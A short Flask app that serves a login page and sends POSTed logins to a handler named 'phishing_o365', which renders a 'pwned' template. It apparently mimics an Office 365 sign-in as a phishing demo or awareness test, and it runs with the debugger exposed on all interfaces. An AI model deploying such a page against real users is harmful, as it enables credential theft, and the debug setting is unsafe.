from flask import Flask, render_template, request
import os

application = Flask(__name__)

@application.route("/")
def other():
    return render_template('login.html')

@application.route('/login.html', methods=['POST'])
def phishing_o365():
    return render_template('pwned.html', request=request)

if __name__ == "__main__":
    port = int(os.environ.get('PORT', 80))
    application.run(debug=True, host='0.0.0.0', port=port)